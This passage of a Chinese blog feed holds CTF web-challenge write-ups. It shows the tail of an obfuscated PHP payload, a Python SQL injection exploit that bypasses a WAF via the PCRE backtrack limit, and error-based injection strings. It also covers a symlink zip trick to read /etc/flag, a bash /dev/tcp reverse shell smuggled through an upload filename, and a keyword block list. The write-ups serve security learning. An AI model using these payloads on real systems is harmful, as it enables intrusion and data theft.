ot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.&quot; &quot;.&quot;&#x2F;&quot;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;;$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<img src="/2020/09/05/DASAugust/7.png" class="">

<p>é€šè¿‡è¿™é“é¢˜æä¾›äº†æ–°æ€è·¯ï¼Œä¹‹åç¢°åˆ°ç±»ä¼¼çš„ä¹Ÿå¯ä»¥å°è¯•ç±»ä¼¼çš„æ–¹æ³•</p>
]]></content>
      <tags>
        <tag>DAS</tag>
      </tags>
  </entry>
  <entry>
    <title>DASfinaltest</title>
    <url>/2020/08/15/DASfinaltest/</url>
    <content><![CDATA[<h2 id="EZSQL"><a href="#EZSQL" class="headerlink" title="EZSQL"></a>EZSQL<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>æ–‡ä»¶åŒ…å«</li>
<li>SQLæ³¨å…¥</li>
<li>phpä¼ªåè®®</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œurlå¤„å‘ç°å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œç”¨<code>filter://</code>åè®®å°è¯•è¯»å–ï¼ŒæˆåŠŸï¼Œæ‹¿åˆ°æºç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/favicon.ico"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"starter-template.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-md navbar-dark bg-dark fixed-top"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"navbar-toggler"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbarsExampleDefault"</span> <span class="attr">aria-controls</span>=<span class="string">"navbarsExampleDefault"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-label</span>=<span class="string">"Toggle navigation"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"navbar-toggler-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"navbarsExampleDefault"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav mr-auto"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./index.php"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item active"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./file.php?file=list"</span>&gt;</span>List<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">aria-labelledby</span>=<span class="string">"dropdown01"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Another action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Something else here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"starter-template"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lead"</span>&gt;</span>        </span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"sql.php"</span>)<span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span><span class="comment">&lt;!-- /.container --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript</span></span><br><span class="line"><span class="comment">    ================================================== --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">window.jQuery || document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/jquery-slim.min.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>')</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/popper.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‰ç«¯ä»£ç ï¼Œåœ¨è¿™é‡Œé¢æ‰¾åˆ°äº†åŒ…å«çš„sql.phpæ–‡ä»¶ï¼Œè¯»å–sql.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$id=<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) ? $_POST[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT|\/\*.*\*\/|sleep|and|if|&amp;&amp;|\|\||\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is'</span>, $id)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($conn,<span class="string">"set names utf8"</span>);</span><br><span class="line">$sql=<span class="string">"select * from `ctf` where id ='"</span>.$id.<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">$row=mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">if</span>($id==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;img src='./img/1.png'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;img src='./img/2.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;img src='./img/3.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"what do you do?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°å¸¸ç”¨çš„æ³¨å…¥å…³é”®è¯éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸€äº›ä½œç”¨ç›¸åŒçš„å…³é”®è¯ä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿™é‡Œç”¨åˆ°äº†pç¥ä¸€ç¯‡æ–‡ç« çš„çŸ¥è¯†æ¥ç»•è¿‡WAFï¼Œåˆ©ç”¨PCREå›æº¯æ¬¡æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè‹±æ–‡ç‰ˆçš„æ˜¯100ä¸‡æ¬¡ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
<p>ä¸Šexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://das.wetolink.com:44006/sql.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,version(),3#"</span></span><br><span class="line">&#125;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#"</span></span><br><span class="line">&#125;<span class="comment">#ctf,flag</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#id,flag</span></span><br><span class="line">data3 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(flag),3 from flag#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#flag&#123;e22d7e217c1ceebc286c3d8e6ee70a0b&#125;  </span></span><br><span class="line">response = requests.post(url=url,data=data3)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>



<h2 id="WrongSQL"><a href="#WrongSQL" class="headerlink" title="WrongSQL"></a>WrongSQL</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>æŠ¥é”™æ³¨å…¥</li>
<li>é•¿åº¦é™åˆ¶</li>
<li>WAFç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ³¨å†Œç™»å½•ï¼Œåœ¨show.phpé¡µé¢å‘ç°idå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•å‘ç°ï¼Œæ³¨é‡Šç¬¦ï¼Œunionï¼Œç©ºæ ¼ç­‰è¢«è¿‡æ»¤ï¼Œæ ¹æ®é¢˜ç›®ä»¥åŠè¢«è¿‡æ»¤çš„å…³é”®è¯ï¼Œåº”è¯¥ç”¨æŠ¥é”™æ³¨å…¥</p>
<p>å°è¯•ä¸€ä¸‹è¯»å–ç‰ˆæœ¬å·ï¼Œè¿™é‡Œç©ºæ ¼å¯ä»¥ç”¨/**/æˆ–è€…æ‹¬å·ç»•è¿‡,æœ€åé¢çš„#(%23)è¢«è¿‡æ»¤é—­åˆå•å¼•å·å³å¯</p>
<img src="/2020/08/15/DASfinaltest/1.png" class="">

<p>è¯»å–æ•°æ®åº“åï¼Œè¿™é‡Œä¼šå‘ç°æœ‰é•¿åº¦é™åˆ¶ï¼Œå‡†ç¡®çš„è®²ï¼ŒæŠ¥é”™æ³¨å…¥åŸºæœ¬éƒ½ä¼šé™åˆ¶å›æ˜¾é•¿åº¦ï¼Œç”¨substræˆªå–åˆ†ä¸¤æ¬¡å›æ˜¾å°±å¯ä»¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">55</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">#XPATH syntax error: '</span>~a,<span class="keyword">sys</span>,z3333333~<span class="string">'</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/2.png" class="">

<p>è¯»å–æœ€åè¿™ä¸€ä¸ªæ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="string">'z3333333'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/3.png" class="">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)=<span class="string">'3333333z'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/4.png" class="">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">1</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">substr</span>((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">20</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/5.png" class="">

<p>ä¸¤æ¬¡çš„ç»“æœæ‹¼æ¥å³å¯</p>
<h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>ç¬¦å·é“¾æ¥ç›®å½•ç©¿è¶Š</li>
<li>å¼±å¯†ç çˆ†ç ´</li>
<li>zipæŒ‡ä»¤</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜éœ€è¦ç™»å½•ï¼Œä¸‡èƒ½å¯†ç ä¸èƒ½ç™»å½•ï¼Œå¹¶ä¸”sqlè¯­å¥æ²¡æœ‰ä»€ä¹ˆå›æ˜¾ï¼Œburpçˆ†ç ´è´¦å·å¯†ç ï¼Œå¾—åˆ°admin/admin</p>
<img src="/2020/08/15/DASfinaltest/6.png" class="">

<p>ä¸‹é¢å°±æ˜¯å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘flagæ‰€åœ¨çš„è·¯å¾„ï¼Œå¹¶ä¸”ä¿å­˜å‹ç¼©æˆzipæ–‡ä»¶ï¼Œè¦ä¿å­˜ç¬¦å·é“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;flag .&#x2F;</span><br><span class="line">zip -r ..&#x2F;tmp.zip . -y</span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/7.png" class="">

<p>ä¸Šä¼ æ–‡ä»¶å³å¯</p>
<img src="/2020/08/15/DASfinaltest/8.png" class="">

<h2 id="sshop"><a href="#sshop" class="headerlink" title="sshop"></a>sshop</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>ä¿¡æ¯æ³„éœ²</li>
<li>pythonä»£ç å®¡è®¡</li>
<li>åå¼¹shell</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ‰«æç›®å½•ï¼Œå‘ç°äº†<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>ä¸‹è½½æ–‡ä»¶ï¼Œå®¡è®¡ä»£ç </p>
<p>åœ¨<code>www/sshop/view/User.py</code>é‡Œå‘ç°äº†å¯ä»¥æ§åˆ¶å‘½ä»¤æ‰§è¡Œï¼Œåœ¨UserImageHandlerç±»ä¸­</p>
<img src="/2020/08/15/DASfinaltest/9.png" class="">

<p>è¿™åº”è¯¥æ˜¯ä¸Šä¼ ä¸ªäººå›¾ç‰‡çš„åœ°æ–¹ï¼Œæ‰¾ä¸€ä¸‹å¯¹åº”ä¸Šä¼ çš„ç±»æˆ–æ–¹æ³•ï¼Œåœ¨<code>www/sshop/view/Module.py</code>ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUploadHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.render(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">		ret = &#123;<span class="string">'result'</span>: <span class="string">'OK'</span>&#125;</span><br><span class="line">		upload_path = os.path.join(os.path.dirname(__file__), <span class="string">'upload'</span>) </span><br><span class="line">		file_metas = self.request.files.get(<span class="string">'file'</span>, <span class="literal">None</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> file_metas:</span><br><span class="line">			self.write(<span class="string">'&lt;script&gt;alert("please upload a image!")&lt;/script&gt;'</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> meta <span class="keyword">in</span> file_metas:</span><br><span class="line">			filename = unquote(meta[<span class="string">'filename'</span>])</span><br><span class="line">			<span class="keyword">if</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.jpg'</span> <span class="keyword">and</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.png'</span>:</span><br><span class="line">				self.write(<span class="string">'&lt;script&gt;alert("only upoded jpg or png !")&lt;/script&gt;'</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			tmp = filename</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">				tmp = unquote(tmp)</span><br><span class="line">			<span class="keyword">if</span> re.search(<span class="string">r'\||\;|\&amp;|\&gt;|\&lt;|\t|\n|\r|\.\.|rm|curl|wget|cat|mv|touch|db'</span>,tmp,re.IGNORECASE):</span><br><span class="line">				self.write(<span class="string">'&lt;script&gt;alert("Hacking!!!")&lt;/script&gt;'</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			user = self.orm.query(User).filter(User.username == self.current_user).one()</span><br><span class="line">			user.avatar = filename</span><br><span class="line">			self.orm.commit()</span><br><span class="line">			file_path = os.path.join(upload_path, filename)</span><br><span class="line">			<span class="keyword">with</span> open(file_path, <span class="string">'wb'</span>) <span class="keyword">as</span> up:</span><br><span class="line">				up.write(meta[<span class="string">'body'</span>])</span><br><span class="line">		self.write(json.dumps(ret))</span><br><span class="line">		self.redirect(<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå±è”½äº†ä¸€äº›å­—ç¬¦å’Œå…³é”®å­—ï¼Œå¯ä»¥è€ƒè™‘ç”¨åå¼•å·ä»¥åŠä¸Šä¼  bash æ–‡ä»¶å¹¶ä¸”ç”¨bashè°ƒç”¨é‚£ä¸ªæ–‡ä»¶åå¼¹ shell è¯•è¯•ï¼Œå†™å…¥ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šä¼ çš„æ—¶å€™æŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹é—®ä»¶åä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#96;bash sshop&#x2F;views&#x2F;upload&#x2F;a.png&#96;.png</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹ååˆ·æ–°ä¸ªäººé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°è§¦å‘äº†åå¼¹ï¼Œä¸‹é¢å°±æ˜¯æ‰¾flagæ–‡ä»¶å¹¶ä¸”æ‹¿åˆ°flag</p>
<img src="/2020/08/15/DASfinaltest/10.png" class="">

